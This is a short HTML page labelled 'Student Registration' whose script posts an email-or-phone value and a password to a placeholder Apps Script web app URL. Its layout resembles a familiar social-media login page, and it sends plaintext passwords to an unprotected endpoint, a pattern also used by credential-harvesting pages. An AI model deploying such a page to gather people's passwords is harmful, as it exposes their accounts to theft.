<!DOCTYPE html>
<html>
<head>
  <title>Registration</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="logo">Registration</div>
      <div class="tagline">Student Registration</div>

      <form id="registrationForm">
        <!-- Email or Phone Number -->
        <input type="text" name="emailOrPhone" placeholder="Email or Phone Number" required>

        <!-- Password -->
        <input type="password" name="password" placeholder="Password" required>

        <!-- Submit button -->
        <button type="submit">Register</button>
      </form>

      <a href="#" class="link">Forgot password?</a>
      <hr>
      <button class="create-btn">Create New Account</button>
    </div>
  </div>

  <script>
    const form = document.getElementById('registrationForm');
    const url = "YOUR_APPS_SCRIPT_WEB_APP_URL"; // replace with your deployed Web App URL

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const data = new FormData(form);

      fetch(url, {
        method: "POST",
        body: data
      })
      .then(response => response.json())
      .then(resp => {
        alert("Form submitted successfully!");
        form.reset();
      })
      .catch(err => alert("Error submitting form: " + err));
    });
  </script>
</body>
</html>
